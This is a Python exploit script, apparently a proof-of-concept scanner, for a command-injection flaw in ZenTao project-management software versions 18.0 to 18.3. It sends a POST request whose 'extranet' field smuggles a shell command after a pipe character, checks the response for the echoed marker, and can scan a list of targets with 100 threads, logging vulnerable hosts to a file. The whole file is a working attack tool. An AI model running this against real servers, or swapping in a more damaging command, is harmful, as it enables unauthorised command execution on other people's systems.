import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________               ________                          ____________  _______              ____________  ________
__  ____/__  /_______ __________  __ \_____ ______      ___   ___<  /_( __ ) __  __ \      ___   ___<  /_( __ ) __|__  /
_  /    __  __ \  __ `/_  __ \_  / / /  __ `/  __ \     __ | / /_  /_  __  | _  / / /________ | / /_  /_  __  | ___/_ < 
/ /___  _  / / / /_/ /_  / / /  /_/ // /_/ // /_/ /     __ |/ /_  / / /_/ /__/ /_/ /_/_____/_ |/ /_  / / /_/ /______/ / 
\____/  /_/ /_/\__,_/ /_/ /_//_____/ \__,_/ \____/___________/ /_/  \____/_(_)____/        _____/ /_/  \____/_(_)____/  
                                                 _/_____/                                                               """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='禅道v18.0-v18.3后台命令执行')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/zentaopms/www/index.php?m=zahost&f=create'
    headers = {
        'UserAgent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:109.0)Gecko/20100101Firefox/110.0Accept:application/json,text/javascript,*/*;q=0.01',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Referer:http':'//127.0.0.1/zentaopms/www/index.php?m=zahost&f=create',
        'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'134',
        'Origin':'http://127.0.0.1',
        'Connection':'close',
        'Cookie':'zentaosid=dhjpu2i3g51l6j5eba85aql27f;lang=zhcn;device=desktop;theme=default;tab=qa;windowWidth=1632;windowHeight=783',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
    }
    data = 'vsoft=kvm&hostType=physical&name=test2&extranet=127.0.0.1%7Cecho%20jqjjqj&cpuCores=2&memory=1&diskSize=1&desc=&uid=64e46f386d9ea&type=za'
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'jqjjqj' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()